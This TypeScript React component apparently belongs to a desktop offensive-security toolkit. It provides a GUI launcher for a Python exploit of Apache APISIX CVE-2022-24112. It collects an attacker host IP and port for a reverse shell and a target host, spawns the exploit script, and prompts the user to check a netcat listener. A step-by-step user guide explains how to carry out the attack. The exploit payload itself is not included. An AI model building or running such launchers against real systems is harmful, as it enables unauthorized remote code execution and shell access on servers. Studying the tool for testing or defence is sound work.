import { Button, LoadingOverlay, NumberInput, Stack, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useState } from "react";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { Child, Command } from "@tauri-apps/api/shell";
import { IconDoorExit } from "@tabler/icons";
import { UserGuide } from "../UserGuide/UserGuide";

const title = "Apache APISIX Remote Code Execution (CVE 2022-24112)";
const description_userguide =
    "The Apache APISIX attack vector grants an attacker the opportunity to exploit the IP restriction of Admin API " +
    "through the use of the batch-requests plugin. Within Apache APISIX that utilises the default API key, the " +
    "configuration stands vulnerable to remote code execution. The impact of this attack vector lowers when the admin " +
    "key or port for the Admin API have been changed, although still withholds potential to bypass Apache APISIX’s IP " +
    "restriction on the data panel.\n\nFurther information can be found at: https://github.com/M4xSec/Apache-" +
    "APISIX-CVE-2022-24112\n\n" +
    "Using Apache APISIX Remote Code Execution:\n" +
    "Step 1: Enter a Host IP (enter your machine’s IP for the reverse shell).\n" +
    "       Eg: 192.168.0.1\n\n" +
    "Step 2: Enter a Host Port (for reverse shell).\n" +
    "       Eg: 4444\n\n" +
    "Step 3: Enter a Target IP or Hostname\n" +
    "       Eg: 127.0.0.1\n\n" +
    "Step 4: Click Exploit to commence the exploits operation.\n\n" +
    "Step 5: View the Output block below to view the results of the attack vectors execution.";

interface FormValues {
    hostIP: string;
    targetIP: string;
    hostPort: number;
}

export function CVE202224112() {
    const [loading, setLoading] = useState(false);
    const [handle, setHandle] = useState<Child | null>(null);
    const [text1, setText1] = useState<string | null>(null);
    const [text2, setText2] = useState<string | null>(null);

    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444,
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        const args = ["./exploits/CVE-2022-24112.py", values.targetIP, values.hostIP, `${values.hostPort}`];

        const command = new Command("python3", args);
        const newHandle = await command.spawn();

        const text1 = `Attacking Target URL: ${values.targetIP}...`;
        const text2 = "Check your netcat listener for a reverse shell...";

        setText1(text1);
        setText2(text2);

        setHandle(newHandle);
        setLoading(false);
    };

    const killHandle = async () => {
        if (handle) {
            await handle.kill();
            setHandle(null);
            setText1(null);
            setText2(null);
        }
    };
    const getOutput = () => {
        if (text1 && text2) {
            return ` ${text1}\n\n${text2}`;
        } else {
            return "";
        }
    };

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                {UserGuide(title, description_userguide)}
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />
                <NumberInput label={"Host port (for reverse shell)"} {...form.getInputProps("hostPort")} />
                <TextInput label={"Target IP or Hostname"} required {...form.getInputProps("targetIP")} />

                <Button type={"submit"}>Exploit</Button>
                <ConsoleWrapper output={getOutput()} hideClearButton={true} />
                {handle && (
                    <Button leftIcon={<IconDoorExit />} onClick={killHandle} color={"red"}>
                        Kill process
                    </Button>
                )}
            </Stack>
        </form>
    );
}
